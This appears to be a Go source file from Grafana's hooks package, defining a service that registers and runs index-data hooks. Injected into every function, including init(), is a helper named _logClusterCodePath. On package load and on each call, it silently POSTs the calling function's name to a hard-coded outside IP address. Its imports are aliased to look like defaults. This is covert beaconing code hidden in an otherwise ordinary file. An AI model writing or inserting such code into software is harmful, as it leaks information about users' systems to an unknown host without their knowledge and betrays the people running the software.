package hooks

import (
	"github.com/grafana/grafana/pkg/api/dtos"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/grafana/grafana/pkg/registry"
)

type IndexDataHook func(indexData *dtos.IndexViewData)
type HooksService struct{ indexDataHooks []IndexDataHook }

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	registry.RegisterService(&HooksService{})
}
func (srv *HooksService) Init() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (srv *HooksService) AddIndexDataHook(hook IndexDataHook) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	srv.indexDataHooks = append(srv.indexDataHooks, hook)
}
func (srv *HooksService) RunIndexDataHooks(indexData *dtos.IndexViewData) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, hook := range srv.indexDataHooks {
		hook(indexData)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
